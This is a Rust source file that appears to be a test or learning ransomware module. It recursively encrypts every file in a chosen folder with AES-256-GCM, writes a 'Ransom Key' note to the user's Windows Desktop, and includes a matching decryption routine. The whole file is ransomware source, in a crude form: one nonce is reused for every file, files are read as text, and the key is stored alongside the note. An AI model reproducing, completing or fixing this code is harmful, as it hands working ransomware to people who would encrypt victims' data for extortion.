use aes_gcm::aead::generic_array::GenericArray;
use aes_gcm::Aes256Gcm;
use aes_gcm::aead::{Aead, KeyInit, OsRng};
use aes_gcm::aead::rand_core::RngCore;
use std::env;
use std::fs;
use std::io::{self, Write};

fn get_content(file_path: &str) -> Result<String, io::Error> {
    fs::read_to_string(file_path)
}

fn folder_check(folder_path: &str) -> Result<Vec<String>, io::Error> {
    let mut file_list = Vec::new();

    for entry in fs::read_dir(folder_path)? {
        let entry = entry?;
        let path = entry.path();

        if path.is_dir() {
            let sub_files = folder_check(path.to_str().unwrap())?;
            file_list.extend(sub_files);
        } else {
            file_list.push(path.display().to_string());
        }
    }

    Ok(file_list)
}

pub fn encrypt(path: String) -> Result<(), io::Error> {
    let mut key_bytes = [0u8; 32];
    OsRng.fill_bytes(&mut key_bytes);
    let key = GenericArray::clone_from_slice(&key_bytes);

    let cipher = Aes256Gcm::new(&key);

    let mut nonce_bytes = [0u8; 12];
    OsRng.fill_bytes(&mut nonce_bytes);
    let nonce = GenericArray::clone_from_slice(&nonce_bytes);

    let file_list = folder_check(&path)?;

    for file_path in file_list {
        let file_content = get_content(&file_path)?;

        let encrypted_data = cipher.encrypt(&nonce, file_content.as_bytes())
            .expect("Encryption failed");

        let mut encrypted_file = fs::File::create(format!("{}.enc", file_path))?;
        encrypted_file.write_all(nonce.as_slice())?; // GenericArray를 &[u8]로 변환
        encrypted_file.write_all(&encrypted_data)?;
    }

    let user_profile = env::var("userprofile").map_err(|e| {
        io::Error::new(io::ErrorKind::NotFound, format!("Failed to read userprofile: {}", e))
    })?;
    let readme_path = format!("{}\\Desktop\\Readme.txt", user_profile);

    let mut file = fs::File::create(&readme_path)?;
    let read_test = format!("This test Ransom Key: {:#?}", key);
    file.write_all(read_test.as_bytes())?;

    Ok(())
}

pub fn decryption(path: String, key: Option<String>) -> Result<(), io::Error> {
    let user_profile = env::var("userprofile").map_err(|e| {
        io::Error::new(io::ErrorKind::NotFound, format!("Failed to read userprofile: {}", e))
    })?;
    let readme_path = format!("{}\\Desktop\\Readme.txt", user_profile);

    let key = if let Some(k) = key {
        k
    } else {
        let key_from_file = get_content(&readme_path)?;
        fs::remove_file(&readme_path)?; 
        key_from_file
    };

    let key_bytes: Vec<u8> = key.into_bytes();
    if key_bytes.len() != 32 {
        return Err(io::Error::new(io::ErrorKind::InvalidInput, "Invalid key length"));
    }
    let key = GenericArray::clone_from_slice(&key_bytes);

    let cipher = Aes256Gcm::new(&key);

    let file_list = folder_check(&path)?;

    for file_path in file_list {
        let encrypted_content = get_content(&file_path)?;

        if encrypted_content.len() < 12 {
            return Err(io::Error::new(io::ErrorKind::InvalidData, "Invalid encrypted file format"));
        }

        let nonce = GenericArray::from_slice(&encrypted_content.as_bytes()[..12]);
        let encrypted_data = &encrypted_content.as_bytes()[12..];

        let decrypted_data = cipher.decrypt(nonce, encrypted_data)
            .map_err(|_| io::Error::new(io::ErrorKind::InvalidData, "Decryption failed"))?;

        let mut decrypted_file = fs::File::create(file_path.replace(".enc", ""))?;
        decrypted_file.write_all(&decrypted_data)?;
    }

    Ok(())
}
